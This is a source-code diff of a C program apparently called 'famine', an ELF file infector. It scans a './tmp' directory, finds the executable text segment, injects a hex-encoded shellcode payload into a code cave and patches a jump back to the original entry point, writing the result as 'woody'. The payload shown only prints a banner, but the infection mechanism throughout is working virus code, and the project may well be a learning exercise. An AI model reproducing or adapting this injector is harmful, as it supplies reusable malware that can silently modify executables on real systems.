@@ -1,18 +1,23 @@
-#include <elf.h>
-#include <sys/syscall.h>
 #include <sys/stat.h>
 #include <sys/mman.h>
 #include <dirent.h>
 #include <fcntl.h>
-#include <sys/types.h>
+#include "famine.h"
+#include <elf.h>
+#include <sys/syscall.h>
+#include "map.h"
+#include "utils.h"
+#include "silvio.h"
 
+#include <sys/types.h>
 #ifndef NULL
 #define NULL ((void *)0)
 #endif
 
+#define JMP_OFFSET 4
 
-char newline __attribute__((section(".text"))) = '\n';
-extern long _syscall(long number, ...);
+char	g_payload[] = "\x52\xeb\x0f\x2e\x2e\x2e\x2e\x57\x4f\x4f\x44\x59\x2e\x2e\x2e\x2e\x0a\x00\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35\xe0\xff\xff\xff\xba\x0f\x00\x00\x00\x0f\x05\x5a\xe9\xd0\xff\xff\xff";
+size_t	g_payload_size	= sizeof(g_payload) - 1;
 
 // utils
 struct linux_dirent64 {
@@ -23,158 +28,85 @@ struct linux_dirent64 {
 	char d_name[];
 };
 
-typedef struct data_s {
-	int _fd;
-	uint8_t* _map;
-	size_t _size;
-} data_t;
+int	patch_new_file(t_data *data) {
 
-int	ft_strlen(const char *s)
-{
-	int i = 0;
-	while (s[i])
-		i++;
-	return (i);
-}
+	char woody[] = "woody";
 
-void	*ft_memset(void *b, int c, size_t len) {
-	uint8_t *ptr = b;
-	for (size_t i = 0; i < len; i++) {
-		ptr[i] = c;
+	int fd = _syscall(SYS_open, woody, O_CREAT | O_WRONLY | O_TRUNC, 0755);
+	if (fd == -1)
+		return 1;
+
+	if (_syscall(SYS_write, fd, data->file, data->size) == -1) {
+		_syscall(SYS_close, fd);
+		return 1;
 	}
-	return b;
-}
 
-void	*ft_memcpy(void *dst, const void *src, size_t size) {
-	uint8_t *d = dst;
-	uint8_t *s = (uint8_t *)src;
 
-	for (size_t i = 0; i < size; i++) {
-		d[i] = s[i];
-	}
-	return dst;
-}
-
-int	ft_memcmp(const void *s1, const void *s2, size_t size) {
-	uint8_t *str1 = (uint8_t *)s1;
-	uint8_t *str2 = (uint8_t *)s2;
-
-	for (size_t i = 0; i < size; i++) {
-		if (str1[i] != str2[i])
-			return (str1[i] - str2[i]);
-	}
-	return (0);
-}
-
-void	ft_strcpy(char *dest, const char *src)
-{
-	int i = 0;
-	while (src[i])
-	{
-		dest[i] = src[i];
-		i++;
-	}
-	dest[i] = '\0';
-}
-
-size_t ft_strlcat(char *dst, const char *src, size_t size)
-{
-	size_t i = 0;
-	size_t j = 0;
-	size_t len = 0;
-	while (dst[i] && i < size)
-		i++;
-	len = i;
-	while (src[j] && i + 1 < size)
-	{
-		dst[i] = src[j];
-		i++;
-		j++;
-	}
-	if (len < size)
-		dst[i] = '\0';
-	return (len + ft_strlen(src));
-}
-
-void	make_path(char *path, const char *dir, const char *file)
-{
-	char slash[] = "/";
-	ft_strcpy(path, dir);
-	ft_strlcat(path, slash, 1024);
-	ft_strlcat(path, file, 1024);
-}
-
-void destroy_data(data_t *data) {
-
-	if (data == NULL)
-		return;
-
-	if (data->_map != NULL)
-		_syscall(SYS_munmap, data->_map, data->_size);
-
-	data->_map = NULL;
-
-	if (data->_fd != -1)
-		_syscall(SYS_close, data->_fd);
-
-	data->_fd = -1;
-}
-//main 
-
-int	map_file(data_t *data, const char *file)
-{
-
-	data->_fd = 0;
-	data->_map = NULL;
-	data->_size = 0;
-	
-	data->_fd = _syscall(SYS_open, file, 0);
-	if (data->_fd < 0)
-		return -1;
-
-	char elf[5] = {0x7f, 'E', 'L', 'F', 0x02};
-
-		char ehdr[5U];
-
-		ft_memset(ehdr, 0, sizeof(ehdr));
-
-		if (_syscall(SYS_read, data->_fd, (long)ehdr, 5U) == -1) {
-			return -1;
-		}
-
-		if (ft_memcmp(ehdr, elf, 5) != 0) {
-			return -1;
-		}
-	
-	struct stat st;
-	if (_syscall(SYS_fstat, data->_fd, &st) < 0)
-		return -1;
-	
-	void *map = (void *)_syscall(SYS_mmap, 0, st.st_size, \
-			PROT_READ | PROT_WRITE, MAP_PRIVATE, data->_fd, 0);
-	if (map == MAP_FAILED)
-		return -1;
-
-	data->_map = (uint8_t *)map;
-	data->_size = st.st_size;
+	_syscall(SYS_close, fd);
 
 	return 0;
 }
 
-void	infect(const char *filename)
-{
-	data_t data;
-	int ret = 0;
+int	calculate_jmp(t_data *data, size_t payload_size) {
 
-	ft_memset(&data, 0, sizeof(data_t));
-	ret = map_file(&data, filename);
-	if (ret == 0)
-	{
-		char msg[] = "start infection\n";
-		_syscall(SYS_write, 1, msg, ft_strlen(msg));
+		data->cave.rel_jmp =  \
+		(int64_t)data->cave.old_entry - \
+		((int64_t)data->cave.addr + (int64_t)payload_size);
+
+	return 0;
+}
+
+char *text_section(t_data *data) {
+	Elf64_Shdr *shdr = data->elf.shdr;
+	Elf64_Ehdr *ehdr = data->elf.ehdr;
+
+	for (int i = 0; i < ehdr->e_shnum; i++) {
+		if (shdr[i].sh_type == SHT_PROGBITS && shdr[i].sh_flags == (SHF_ALLOC | SHF_EXECINSTR)) {
+
+			char *map = (char *)_syscall(SYS_mmap, NULL, shdr[i].sh_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+			if (map == MAP_FAILED)
+				return NULL;
+			ft_memcpy(map, data->file + shdr[i].sh_offset, shdr[i].sh_size);
+			return map;
+			//return (char *)(data->file + shdr[i].sh_offset);
+		}
 	}
-	destroy_data(&data);
+	return NULL;
+}
 	
+
+int	inject(t_data *data) {
+
+	char *text = text_section(data);
+
+	silvio(data, g_payload_size);
+
+	calculate_jmp(data, g_payload_size);
+
+	modify_payload(data->cave.rel_jmp, JMP_OFFSET, sizeof(data->cave.rel_jmp), (uint8_t *)g_payload, g_payload_size);
+
+	ft_memcpy(data->file + data->cave.offset, g_payload, g_payload_size);
+
+	patch_new_file(data);
+
+	return 0;
+}
+
+int	infect(const char *filename)
+{
+	size_t size = 0;
+	uint8_t *file = map_file(filename, &size);
+	if (!file) {
+		return 1;
+	}
+
+	t_data data;
+	init_data(&data, file, size);
+
+	inject(&data);
+
+	free_data(&data);
+	return 0;
 }
 
 void	open_file(char *file)
@@ -211,9 +143,13 @@ void	open_file(char *file)
 
 }
 
+
+
 void	famine(void)
 {
 	//test _sycall failure
+	unsigned long start;
+	__asm__ volatile ("lea (%%rip), %0 " : "=r" (start));
 
 	char p1[] = "./tmp";
 	char *paths[] = {
@@ -223,4 +159,7 @@ void	famine(void)
 
 	for (int i = 0; paths[i]; i++)
 		open_file(paths[i]);
+
+	unsigned long end;
+	__asm__ volatile ("lea (%%rip), %0 " : "=r" (end));
 }
